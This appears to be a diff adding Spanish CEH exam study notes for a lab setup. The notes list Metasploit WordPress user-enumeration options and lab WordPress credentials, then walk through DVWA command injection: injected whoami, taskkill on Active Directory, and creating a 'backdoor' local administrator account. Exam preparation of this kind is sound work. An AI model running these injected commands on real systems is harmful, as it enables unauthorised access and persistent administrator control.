@@ -277,6 +277,44 @@
  Para probar la hay que hacerlo con la máquina WS16, con WAMP activo y en la url 192.168.10.16:8080/CEH.
  Credenciales WordPress: admin:qwerty@123
  
+ Explotar vulnerabilidad de WordPress con Metasploit
+ ---------------------------------------------------
+ Enumerar Usuarios con Metasploit
+ --------------------------------
+ Usamos el modulo auxiliary/scanner/http/wordpress_login_enum.
+ Le tenemos que modificar las siguientes opciones:
+   - RHOSTS --> 192.168.10.16
+   - RPORT --> 8080
+   - USER_FILE --> [PATH]
+   - PASS_FILE --> [PATH]
+   - TARGETURI --> /CEH
+ Lo lanzamos con RUN y vemos el resultado.
+ 
+ Aplicación DVWA  IMPORTANTE: Muy posible que esta sea la aplicación web que haya que explotar en el examen práctico
+ -------------------------------------------------------------------------------------------------------------------
+ Command Injection
+ -----------------
+ Si es una máquina Linux podemos concatenar comandos con ";" y si es una máquina Windows podemos utilizar "|" o "&".
+ 
+ En este caso, hemos hecho los siguientes comandos:
+   - | whoami
+   - | echo Has sido hackeado!! > c:\Users\Administrator\Desktop\prueba.txt
+ 
+ En el comando whoami nos ha indicado que la aplicación se está ejecutando desde el usuario nt authority/ system.
+ 
+ Queremos crearnos un usuario local para tener acceso a la máquina, para ello tenemos que detener el Active Directory porque sino no podríamos crear usuarios locales.
+ 
+ Para ello vamos a seguir los siguientes pasos:
+ 1. Lanzamos el comando "| tasklist" para conseguir el PID de Microsoft.ActiveDirectory.
+ 2. Para matar el proceso utilizamos el comando "| taskkill /pid [PID] /F
+ 3. Volvemos a lanzar el comando "| tasklist" para comprobar que efectivamente se ha parado el Active Directory.
+ 4. Vamos a ver que usuarios hay creados actualmente en la máquina con el comando "| net user". De cara al examen si me preguntan cuantos usuarios hay no debo contar krbtgt.
+ 5. Para crearnos un usuario utilizamos el comando "| net user backdoor P4$$w0rd /add". IMPORTANTE: Indicar la contraseña para la creación del usuario.
+ 6. Comprobar que se ha creado el usuario, "| net user".
+ 7. Añadimos al usuario que hemos creado al grupo Local de Administradores con el comando "| net localgroup Administrators backdoor /add".
+ 
+
+ 
  
  
   
